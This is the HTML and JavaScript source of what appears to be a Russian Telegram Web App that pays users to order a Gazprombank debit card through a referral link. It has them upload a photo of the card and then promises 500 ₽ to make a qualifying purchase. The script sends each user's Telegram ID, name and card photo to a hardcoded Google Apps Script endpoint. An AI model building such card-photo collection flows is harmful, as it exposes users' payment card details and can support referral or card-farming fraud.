<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Лента заданий</title>
  <style>
    /* Сброс стилей и фиксация экрана (TikTok-эффект) */
    body, html {
      margin: 0; padding: 0; height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #000; color: #fff; overflow: hidden; overscroll-behavior-y: none;
    }

    /* Верхняя панель */
    .top-bar {
      position: fixed; top: 0; left: 0; right: 0; padding: 16px 20px;
      display: flex; justify-content: space-between; align-items: center;
      z-index: 10; background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%);
    }
    .balance-badge {
      background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(10px);
      padding: 8px 16px; border-radius: 20px; font-weight: 700; font-size: 15px;
      border: 1px solid rgba(255, 255, 255, 0.2); display: flex; align-items: center; gap: 6px; cursor: pointer;
    }
    .admin-btn {
      background: rgba(255, 60, 60, 0.3); color: #fff; border: 1px solid rgba(255, 60, 60, 0.5); 
      padding: 8px 12px; border-radius: 12px; font-weight: 700; cursor: pointer; font-size: 13px;
    }
    .support-btn { background: none; border: none; color: #fff; font-size: 14px; opacity: 0.8; font-weight: 600; }

    /* Контейнер для свайпов */
    .feed-container {
      height: 100vh; overflow-y: scroll; scroll-snap-type: y mandatory; scrollbar-width: none;
    }
    .feed-container::-webkit-scrollbar { display: none; }

    /* Экран одного задания */
    .slide {
      height: 100vh; width: 100vw; scroll-snap-align: start; position: relative;
      display: flex; flex-direction: column; justify-content: flex-end;
      padding: 20px; box-sizing: border-box; padding-bottom: 40px;
    }

    /* Градиенты банков */
    .bg-gazprom { background: linear-gradient(135deg, #001f54, #0052D4, #4364F7); }
    .bg-alfa { background: linear-gradient(135deg, #4a0000, #a00000, #ff4b2b); }

    /* Информация об оффере */
    .offer-header { margin-bottom: 24px; text-shadow: 0 2px 10px rgba(0,0,0,0.5); }
    .bank-name { font-size: 38px; font-weight: 800; margin: 0 0 4px 0; letter-spacing: -1px; }
    .reward-sum { font-size: 28px; color: #4ade80; font-weight: 800; margin: 0; }
    .offer-desc { font-size: 15px; opacity: 0.9; margin-top: 8px; line-height: 1.4; }

    /* Стеклянная панель с шагами */
    .glass-panel {
      background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px);
      border-radius: 24px; padding: 24px; border: 1px solid rgba(255, 255, 255, 0.2);
      margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    }

    /* Трекер шагов */
    .step { display: flex; align-items: flex-start; margin-bottom: 16px; opacity: 0.4; transition: all 0.3s ease; }
    .step:last-child { margin-bottom: 0; }
    .step.active { opacity: 1; transform: scale(1.02); }
    .step.done { opacity: 0.7; }
    
    .step-circle {
      width: 28px; height: 28px; border-radius: 50%; border: 2px solid #fff;
      display: flex; align-items: center; justify-content: center; margin-right: 16px;
      font-size: 13px; font-weight: bold; flex-shrink: 0; transition: all 0.3s;
    }
    .step.active .step-circle { background: #fff; color: #000; box-shadow: 0 0 15px rgba(255,255,255,0.5); }
    .step.done .step-circle { background: #4ade80; border-color: #4ade80; color: #000; }
    .step.done .step-circle::after { content: '✓'; }
    .step.done .step-number { display: none; }

    .step-text { flex-grow: 1; }
    .step-title { font-size: 16px; font-weight: 600; margin-bottom: 2px; }
    .step-sub { font-size: 12px; opacity: 0.8; }
    .step.done .step-title { text-decoration: line-through; }

    /* Кнопка действия */
    .action-btn {
      background: #fff; color: #000; border: none; width: 100%; padding: 18px;
      border-radius: 16px; font-size: 17px; font-weight: 700; cursor: pointer;
      transition: all 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px;
    }
    .action-btn:active { transform: scale(0.96); }
    .action-btn.green { background: #4ade80; color: #000; }
    .action-btn:disabled { opacity: 0.7; cursor: not-allowed; }
    
    /* Скрытый инпут для фото */
    #photo-upload { display: none; }
  </style>
</head>
<body>

  <!-- Верхняя панель -->
  <div class="top-bar">
    <div class="balance-badge" onclick="withdraw()">
      💰 0 ₽ <span style="font-size: 12px; opacity: 0.7; margin-left: 4px;">Вывести</span>
    </div>
    
    <!-- Временная кнопка Админа -->
    <button class="admin-btn" onclick="window.location.href='admin.html'">Админ</button>
    <button class="support-btn">Поддержка</button>
  </div>

  <div class="feed-container">
    
    <!-- СЛАЙД 1: Газпромбанк -->
    <div class="slide bg-gazprom">
      <div class="offer-header">
        <h1 class="bank-name">Газпромбанк</h1>
        <div class="reward-sum">+ 2 500 ₽</div>
        <div class="offer-desc">Бесплатная дебетовая карта. Выполните 3 шага для зачисления выплаты.</div>
      </div>

      <div class="glass-panel">
        <div class="step active" id="step1">
          <div class="step-circle"><span class="step-number">1</span></div>
          <div class="step-text">
            <div class="step-title">Заказать карту</div>
            <div class="step-sub">По нашей специальной ссылке</div>
          </div>
        </div>
        
        <div class="step" id="step2">
          <div class="step-circle"><span class="step-number">2</span></div>
          <div class="step-text">
            <div class="step-title">Подтвердить получение</div>
            <div class="step-sub">Загрузить фото пластика</div>
          </div>
        </div>
        
        <div class="step" id="step3">
          <div class="step-circle"><span class="step-number">3</span></div>
          <div class="step-text">
            <div class="step-title">Целевое действие</div>
            <div class="step-sub">Запросить средства на покупку</div>
          </div>
        </div>
      </div>

      <button class="action-btn" id="main-btn" onclick="nextAction('Газпромбанк', 2500)">Заказать карту</button>
      <input type="file" id="photo-upload" accept="image/*" onchange="handlePhotoUpload('Газпромбанк')">
    </div>

  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    // ВСТАВЬ СЮДА СВОЮ ССЫЛКУ ОТ GOOGLE APPS SCRIPT
    const API_URL = 'https://script.google.com/macros/s/AKfycbyeygFa80Qu0cQ1kBMR1KFwl3IN-43FkA-3Px-q74YEwRQHVrr2K14A-lqZ_SA8yuJX/exec'; 
    const tg = window.Telegram.WebApp;
    tg.expand();

    let currentStep = 1;
    const btn = document.getElementById('main-btn');
    const uploadInput = document.getElementById('photo-upload');
    const user = tg.initDataUnsafe?.user || { id: 12345678, first_name: 'Тест' };

    async function sendRequest(payload) {
      try {
        const response = await fetch(API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
          body: JSON.stringify(payload)
        });
        return await response.json();
      } catch (error) {
        console.error(error);
        return { status: 'error', message: 'Ошибка соединения' };
      }
    }

    async function nextAction(offerName, payoutSum) {
      if (currentStep === 1) {
        btn.innerText = 'Отправка...';
        btn.disabled = true;

        // Отправляем лида в таблицу
        const payload = {
          action: 'addLead',
          leadId: user.id,
          adminId: '987654321',
          name: user.first_name,
          offer: offerName,
          payout: payoutSum
        };

        const result = await sendRequest(payload);

        if (result.status === 'success') {
          // Имитация редиректа на партнерскую ссылку банка
          // window.open('ТВОЯ_РЕФ_ССЫЛКА', '_blank');
          
          document.getElementById('step1').classList.remove('active');
          document.getElementById('step1').classList.add('done');
          document.getElementById('step2').classList.add('active');
          
          btn.innerHTML = '📷 Прикрепить фото карты';
          btn.disabled = false;
          currentStep = 2;
        } else {
          tg.showAlert('Произошла ошибка: ' + result.message);
          btn.innerText = 'Заказать карту';
          btn.disabled = false;
        }
      } 
      else if (currentStep === 2) {
        // Вызываем нативное окно выбора фото на телефоне
        uploadInput.click();
      }
      else if (currentStep === 3) {
        // Шаг 3: Запрос средств на ЦД
        btn.innerText = '⏳ Запрос отправлен...';
        btn.disabled = true;
        
        // Тут будет запрос к API для статуса "Ждет 500р"
        setTimeout(() => {
          tg.showAlert('Запрос отправлен. Ожидайте поступления средств на баланс для выполнения целевого действия.');
          btn.innerText = '⏳ Ожидание средств';
        }, 1000);
      }
    }

    // Обработка загруженного фото
    function handlePhotoUpload(offerName) {
      if (uploadInput.files.length === 0) return;
      
      const file = uploadInput.files[0];
      const reader = new FileReader();
      
      btn.innerHTML = '⏳ Загрузка фото...';
      btn.disabled = true;

      // Конвертируем фото в формат Base64 (текст) для отправки на сервер
      reader.onloadend = async function() {
        const base64String = reader.result;
        
        const payload = {
          action: 'uploadPhoto',
          leadId: user.id,
          offer: offerName,
          photoData: base64String // В скрипте мы будем пересылать это в бота
        };

        // Отправляем фото
        const result = await sendRequest(payload);

        document.getElementById('step2').classList.remove('active');
        document.getElementById('step2').classList.add('done');
        document.getElementById('step3').classList.add('active');
        
        btn.innerHTML = '💳 Запросить 500₽ на покупку';
        btn.disabled = false;
        currentStep = 3;
        
        tg.showAlert('Фото успешно загружено и отправлено на проверку!');
      };
      
      reader.readAsDataURL(file);
    }

    function withdraw() {
      tg.showPopup({
        title: 'Вывод средств',
        message: 'Куда хотите вывести заработанные деньги?',
        buttons: [
          {id: 'sbp', type: 'default', text: 'По номеру телефона (СБП)'},
          {id: 'crypto', type: 'default', text: 'Кошелек Telegram (USDT/TON)'},
          {type: 'cancel'}
        ]
      });
    }
  </script>
</body>
</html>
